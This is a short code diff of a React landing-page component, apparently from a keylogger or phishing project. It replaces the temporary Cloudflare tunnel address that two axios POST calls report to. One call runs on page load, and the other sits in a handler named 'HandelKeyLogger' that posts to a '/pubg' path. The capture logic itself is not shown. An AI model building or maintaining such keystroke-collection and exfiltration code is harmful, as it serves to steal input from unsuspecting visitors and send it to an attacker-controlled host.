@@ -5,7 +5,7 @@ export default function LandingPage() {
 
   useEffect(()=>{
     const getdata=async()=>{
-        await axios.post('https://lopez-acting-radiation-mortgages.trycloudflare.com/').then((result)=>{
+        await axios.post('https://directly-legend-hunt-laptops.trycloudflare.com/').then((result)=>{
             console.log(result.data)
         }).catch((err)=>{
             console.log(err)
@@ -16,7 +16,8 @@ export default function LandingPage() {
   },[])
 
   const HandelKeyLogger=async()=>{
-        await axios.post("https://lopez-acting-radiation-mortgages.trycloudflare.com/pubg").then((result)=>{
+        await axios.post("https://directly-legend-hunt-laptops.trycloudflare.com/pubg").then((result)=>{
+            console.log("Hi")
             console.log(result.data)
         }).catch((err)=>{
             console.log(err)
